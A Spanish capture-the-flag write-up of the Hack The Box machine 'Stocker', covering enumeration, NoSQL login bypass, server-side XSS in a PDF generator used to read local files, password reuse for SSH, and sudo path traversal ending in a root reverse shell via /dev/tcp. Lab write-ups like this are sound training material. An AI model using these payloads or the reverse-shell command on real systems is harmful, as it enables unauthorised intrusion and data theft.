---
layout: post
title: Stocker - Hack The Box
date: 2025-10-14
categories: [Hack The Box, Linux]
tags:  [Linux, Fuzz, Wfuzz, LFI, API, Curl, App, Web, Mongo, NoSQL, XSS, Javascript]
image:
  path: htb-writeup-stocker/stocker.png
  alt: stocker
---

![logo](htb-writeup-stocker/stocker-logo.png){: .right w="200" h="200" }
Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identifica el nombre de host `dev.stocker.htb` y, al acceder a él, se carga una página de inicio de sesión que parece estar construida con `NodeJS`. Al enviar datos JSON y realizar una inyección `NoSQL`, se omite la página de inicio de sesión y se concede acceso a una tienda electrónica. La enumeración de esta tienda electrónica revela que, al enviar un pedido de compra, se crea un PDF que contiene detalles sobre los artículos comprados. Esta funcionalidad es vulnerable a la inyección de HTML y puede utilizarse indebidamente para leer archivos del sistema mediante el uso de iframes. A continuación, se lee el archivo `index.js` para obtener las credenciales de la base de datos y, debido a la reutilización de contraseñas, los usuarios pueden iniciar sesión en el sistema a través de `SSH`. A continuación, se pueden escalar los privilegios realizando un ataque de recorrido de ruta en un comando definido en el archivo sudoers, que contiene un comodín para ejecutar archivos `JavaScript`.

## Reconocimiento

### Nmap

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.196
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 08:43 EDT
Initiating SYN Stealth Scan at 08:43
Scanning 10.10.11.196 [65535 ports]
Discovered open port 22/tcp on 10.10.11.196
Discovered open port 80/tcp on 10.10.11.196
Completed SYN Stealth Scan at 08:44, 17.18s elapsed (65535 total ports)
Nmap scan report for 10.10.11.196
Host is up, received user-set (0.15s latency).
Scanned at 2024-04-29 08:43:56 EDT for 18s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
{: .nolineno}

Tenemos 2 puertos abiertos

```bash
22 -> SSH
80 -> HTTP
```
{: .nolineno}

### Nmap Servicios de Puertos

```bash
nmap -p22,80 -sCV 10.10.11.196
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 08:48 EDT
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
|_http-generator: Eleventy v2.0.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

### Tecnologias Web

```python
whatweb http://10.10.11.196
http://10.10.11.196 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.196], RedirectLocation[http://stocker.htb], Title[301 Moved Permanently], nginx[1.18.0]
```
{: .nolineno}

En esta fase de reconocimiento logramos ver un dominio `stocker.htb` vamos a colocarlo dentro del archivo /etc/hosts para que nos redirija la ip al dominio y poder ingresar a la web real.

```bash
echo '10.10.11.196 stocker.htb' >> /etc/hosts
```

{: .nolineno}

## Web

![](htb-writeup-stocker/stocker1.png)

### Enumeracion Web Fuzz

```bash
wfuzz -c --hc=404 --hh=15463 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://stocker.htb/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://stocker.htb/FUZZ
Total requests: 220560
=====================================================================
ID           Response   Lines    Word       Chars       Payload                              
=====================================================================
000000039:   301        7 L      12 W       178 Ch      "img"                             
000000550:   301        7 L      12 W       178 Ch      "css"                                                           
000000953:   301        7 L      12 W       178 Ch      "js"                                                                     
000002771:   301        7 L      12 W       178 Ch      "fonts"
```

{: .nolineno}

En esta parte encontramos cosas tipicas que existen en una web, sin embargo no son de relevancia. Tener una buena metodologia de enumeracion hace que puedas llegar mas alla y conseguir muchas vias de explotacion.

### Enumeracion Web Fuzz Domain

```bash
wfuzz -c --hc=404 --hh=178,166 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.stocker.htb" http://stocker.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://stocker.htb/
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                         
=====================================================================
000000834:   302        0 L      4 W        28 Ch       "dev"
```

Fuzzeamos en la parte donde van los subdominios y encontramos `dev.stocker.htb`, vamos a incorporarlo a nuestro `/etc/hosts` y ver que nos resuelve la web.

{: .nolineno}

```bash
curl http://dev.stocker.htb -I -v
* Host dev.stocker.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.196
*   Trying 10.10.11.196:80...
* Connected to dev.stocker.htb (10.10.11.196) port 80
> HEAD / HTTP/1.1
> Host: dev.stocker.htb
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 Found
HTTP/1.1 302 Found
< Server: nginx/1.18.0 (Ubuntu)
Server: nginx/1.18.0 (Ubuntu)
< Date: Mon, 29 Apr 2024 12:59:32 GMT
Date: Mon, 29 Apr 2024 12:59:32 GMT
< Content-Type: text/plain; charset=utf-8
Content-Type: text/plain; charset=utf-8
< Content-Length: 28
Content-Length: 28
< Connection: keep-alive
Connection: keep-alive
< X-Powered-By: Express
X-Powered-By: Express
< Location: /login
Location: /login
< Vary: Accept
Vary: Accept
< Set-Cookie: connect.sid=s%3AAqXpouaZNkKv1VkwiWJNKGzTULe4csBN.pelTgGT%2BuVN9nhF7WPaBGq5y2pltzSvT43wY9wWX0rQ; Path=/; HttpOnly
Set-Cookie: connect.sid=s%3AAqXpouaZNkKv1VkwiWJNKGzTULe4csBN.pelTgGT%2BuVN9nhF7WPaBGq5y2pltzSvT43wY9wWX0rQ; Path=/; HttpOnly
```
{: .nolineno}

Es importante observar cada detalle de la web que estamos auditando, asi podemos deducir el lenguaje con el que esta programado la aplicacion web.

{: .nolineno}

![](htb-writeup-stocker/stocker2.png)

{: .nolineno}

Tenemos un panel de acceso a login, puede ser vulnerable a SQL injection o NoSQL injection, vamos a comprobarlo ahora, hay mas probabilidad de que sea vulnerable a NoSQLI por diferentes motivos, una de ellas es que en las tecnologias que implementa aplicacion web es que esta desarrollado en Express JS y NodeJS, maneja entradas de application/json

### SQL Injection

```bash
curl dev.stocker.htb/login -d "username='&password=test"; echo
Found. Redirecting to /login?error=login-error

curl dev.stocker.htb/login -d "username='+or+1=1--+-&password=test"; echo
Found. Redirecting to /login?error=login-error

curl dev.stocker.htb/login -d "username='+or+sleep(10)--+-&password=test"; echo
Found. Redirecting to /login?error=login-error

curl dev.stocker.htb/login -d $'{"username":"\'","password":"test"}' -H 'Content-Type: application/json'; echo
Found. Redirecting to /login?error=login-error

curl dev.stocker.htb/login -d $'{"username":"\' or 1=1-- -","password":"test"}' -H 'Content-Type: application/json'; echo
Found. Redirecting to /login?error=login-error
```

Siempre que vemos un panel de acceso quiero intentar bypassearlo de diferentes maneras, ya sea Inyecciones SQL o NoSQL (`'`,`"`) pero como dije antes, estas inyecciones fallaron porque creemos que por detras existe un Mongo DB y no un MySQL como base de datos, quiere decir que la vulnerabilidad puede estar por un NoSQLI

### NoSQL Injection y Bypass Authentication

```bash
curl dev.stocker.htb/login -d 'username[$ne]=test&password[$ne]=test'; echo
Found. Redirecting to /login?error=login-error
```

```bash
curl dev.stocker.htb/login -d $'{"username":{"$ne":"test"},"password":{"$ne":"test"}}' -H 'Content-Type: application/json'; echo
Found. Redirecting to /stock
```

Ya tenemos una inyeccion exitosa, es importante que en la peticion agreguemos la cabezera `Content-Type: application/json` porque estamos enviando data en formato `json`, vamos reenviarlo por el puerto 127.0.0.1:8080 al burpsuite desde curl

Este es el payload que usamos en la inyeccion para bypassear la autenticacion

```bash
{"username":{"$ne": "test"}, "password": {"$ne":"test"}}
```

Esto hara lo siguiente: siempre que haya al menos un usuario que no sea "test" y una contraseña que no sea "test", ese usuario sera devuelto y iniciara sesion. 

```bash
curl dev.stocker.htb/login -d $'{"username":{"$ne":"test"},"password":{"$ne":"test"}}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![](htb-writeup-stocker/stocker3.png)

![](htb-writeup-stocker/stocker4.png)

copiamos y pegamos la cookie de sesion y ya bypasseamos el panel de login

![](htb-writeup-stocker/stocker5.png)

Parece una aplicación web para comprar cosas raras. Hay 4 articulos en la web que Podemos agregar al carrito de compras.

![](htb-writeup-stocker/stocker6.png)

![](htb-writeup-stocker/stocker7.png)

cuando hacemos click en ver carrito, se nos abre esta ventana indicando todos los componentes que agregamos. Vamos a darle a submit purchase

![](htb-writeup-stocker/stocker8.png)

Vemos un enlace en `here` que nos reedirige a `http://dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a` un comprobante de pago en PDF, esto nos resuelve a una api que esta a la vista del publico y expuesta. Para desglosar el PDF y ver el origen del mismo, procedemos al descargo y comprobar con exiftool de que se trata.

![](htb-writeup-stocker/stocker9.png)

Si ejecutamos exiftool en este documento, veremos que se genera usando Chromium (Skia/PDF m108):

```bash
curl -s dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a | exiftool -  
ExifTool Version Number         : 12.50
File Size                       : 0 bytes
File Modification Date/Time     : 2023:01:14 00:00:00+01:00
File Access Date/Time           : 2023:01:14 00:00:00+01:00
File Inode Change Date/Time     : 2023:01:14 00:00:00+01:00
File Permissions                : prw-rw----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:01:13 23:00:00+00:00
Modify Date                     : 2023:01:13 23:00:00+00:00
```

en `/stocks` existe un flujo de peticiones importantes como `/api/products`, muestra toda la informacion sobre los productos que vende la aplicacion web

![](htb-writeup-stocker/stocker10.png)

El comportamiento de esta aplicacion web es agregar un articulo a mi carrito y destella una ventana emergente, sin embargo no llega a enviar ninguna solicitud, por lo que ni siquiera se almacena de manera local, sino simplemente en el JavaScript del lado del cliente en ejecución.

Interceptamos el boton `submit purchase`

![](htb-writeup-stocker/stocker11.png)

incluye los articulos a comprar y algunos campos que podemos modificar y ver como se comporta la web.

![](htb-writeup-stocker/stocker12.png)

en la anterior imagen modificamos el valor de `amount` a no poner nada y dejarlo vacio, esto provoco un error en la web y nos devolvio algunas rutas que podriamos aprovechar si logramos conseguir algun `File Inclusion`.

### XSS 

Hay una carga util que podemos utilizar para comprobar si es vulnerable a XSS.

```bash
<img src=\"x\" onerror=\"document.write('test')\" />
```

![](htb-writeup-stocker/stocker13.png)

Y porque elegimos el campo `title`?, es simple. Porque ese campo se ve reflejado en el comprobante de pago del PDF que generamos. 

La web informa que la compra se realizo correctamente. Al visitar la URL de esa orden de compra ( /api/po/[id]) muestra que funciono:

![](htb-writeup-stocker/stocker14.png)

`test` sobrescribio todo el resto del HTML/CSS que estaba creando el PDF.

### Read Local File

Ya tenemos identificada la vulnerabilidad de XSS pero aparte de eso podemos derivarlo a una Lectura de archivos locales, de que manera logramos dicho objetivo?. Si una página web está creando un PDF utilizando una entrada controlada por el usuario, puedes intentar engañar al bot que está creando el PDF para que ejecute código JS arbitrario. Entonces, si el bot creador de PDF encuentra algún tipo de etiquetas HTML, las interpretará y puede abusar de este comportamiento para provocar un XSS en el servidor. [Read Local File](https://n3t-hunt3r.gitbook.io/pentest-book/web-application-pentesting/xss-cross-site-scripting/server-side-xss-less-than-dynamic-pdf-greater-than)

```bash
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

tenemos que escapar las comillas dobles porque si no no funciona el payload

```bash
<script>x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open(\"GET\",\"file:///etc/passwd\");x.send();</script>
```

![](htb-writeup-stocker/stocker15.png)

![](htb-writeup-stocker/stocker16.png)

En el comprobante de pago vemos lo siguiente: una cadena codificada en base64, vamos a decodificarla con el siguiente comando

```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usrbase64: entrada inválida
```

Excelente!!! Vemos el /etc/passwd, en este punto ya podemos decir que estamos ante un File Inclusion y podemos ver archivos del sistema, lo siguiente sera ver el codigo fuente para escalar esta vulnerabilidad.

Pero vemos solo una parte del /etc/passwd, es decir solo las primeras 3 lineas. Para verlo completo podemos inyectar este payload:

```bash
<iframe src=file:///etc/passwd></iframe>
```

![](htb-writeup-stocker/stocker17.png)

![](htb-writeup-stocker/stocker18.png)

Otro payload que puede funcionar y tener un mejor resultado a la hora de leer archivos internos de la maquina es este

```bash
<img src=\"x\" onerror=\"document.write('<iframe src=file:///etc/passwd width=100% height=100%></iframe>')\" />
```

![](htb-writeup-stocker/stocker19.png)

Ya que tenemos perfeccionado lo de leer correctamente los archivos, quedaria tratar de leer el codigo fuente de la aplicacion web "index.js" de `/var/www/dev/index.js`

```javascript
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const {
    generatePDF,
    formatHTML
} = require("./pdf.js");
const {
    randomBytes,
    createHash
} = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
authSource = admin & w = 1 ";
app.use(express.json());
app.use(express.urlencoded({
    extended: false
}));
app.use(
    session({
        secret: randomBytes(32).toString("hex"),
        resave: false,
        saveUninitialized: true,
        store: MongoStore.create({
            mongoUrl: dbURI,
        }),
    })
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
    return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
    if (!req.session.user) return res.json([]);
    const products = await mongoose.model("Product").find();
    return res.json(products);
});
app.get("/login", (req, res) => {
    if (req.session.user) return res.redirect("/stock");
    return res.sendFile(__dirname + "/templates/login.html");
});
app.post("/login", async (req, res) => {
    const {
        username,
        password
    } = req.body;
    if (!username || !password) return res.redirect("/login?error=login-error");
    // TODO: Implement hashing
    const user = await mongoose.model("User").findOne({
        username,
        password
    });
    if (!user) return res.redirect("/login?error=login-error");
    req.session.user = user.id;
    console.log(req.session);
    return res.redirect("/stock");
});
app.post("/api/order", async (req, res) => {
                if (!req.session.user) return res.json({});
                if (!req.body.basket) return res.json({
                    success: false
                });
                const order = new mongoose.model("Order")({
                            items: req.body.basket.map((item) => ({
                                title: item.title,
                                price: item.price,
                                amount: item.amount
                            })),
```

Si analizamos bien el codigo, logramos ver en la parte superior credenciales de acceso a la base de datos `const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?`

Tambien tenemos un usuario del sistema llamado "`angoose`"

```bash
root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
```

Probamos las credenciales que encontramos via ssh por el puerto 22 con el usuario angoose

```bash
ssh angoose@stocker.htb
Password:IHeardPassphrasesArePrettySecure
```

```bash
angoose@stocker:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b9:4d:1b  txqueuelen 1000  (Ethernet)
        RX packets 148246  bytes 13714635 (13.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 127921  bytes 19524574 (19.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 15696  bytes 2585569 (2.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15696  bytes 2585569 (2.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

angoose@stocker:~$ hostname -I
10.10.11.196
```
Bingo!!!! Tenemos una shell por ssh, en esta parte ya podriamos ver la flag de user.txt, ahora solo quedaria enumerar el sistema y escalar privilegios.

## Enumeracion del Sistema

### Version de Linux y Kernel

```bash
angoose@stocker:~$ uname -a
Linux stocker 5.4.0-136-generic #153-Ubuntu SMP Thu Nov 24 15:56:58 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
angoose@stocker:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.5 LTS
Release:	20.04
Codename:	focal
```

### SUDO

Vamos a ver si a nivel de SUDOERS tiene algun permiso para ejecutar algo como root

```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

Y como dijimos antes vemos que a nivel de sudoers nos deja ejecutar como root la herramienta `node` cualquier *.js* script que se encuentre en esa carpeta, pero jugando un poco con bash podemos bypassear esa entrada y ejecutar codigo malicioso en js

## Escalada de Privilegios [RCE JAVASCRIPT]

```bash
sudo /usr/bin/node /usr/local/scripts/../../../../dev/shm/pwned.js
```

El problema aquí es que, si bien el administrador claramente quería permitir que angoose solo ejecutara scripts desde ese directorio, * esto indica que cualquier script que se encuentre ahi lo va ejecutar pero no tenemos permisos de escritura para crear un archivo JS malicioso, asi que un ../ nos dejara ejecutar cualquier JS en el sistema de archivos.


```javascript
require("child_process").exec('ping -c 1 10.10.16.2')
```
Vamos a crear el script que contiene JS malicioso y lo vamos a guardar en `/dev/shm/pwned.js`

Primero vamos a probar ejecuntando el comando ping a nuestra maquina

![](htb-writeup-stocker/stocker20.png)

### Shell como Root

`require("child_process").exec('bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"')`

![](htb-writeup-stocker/stocker21.png)

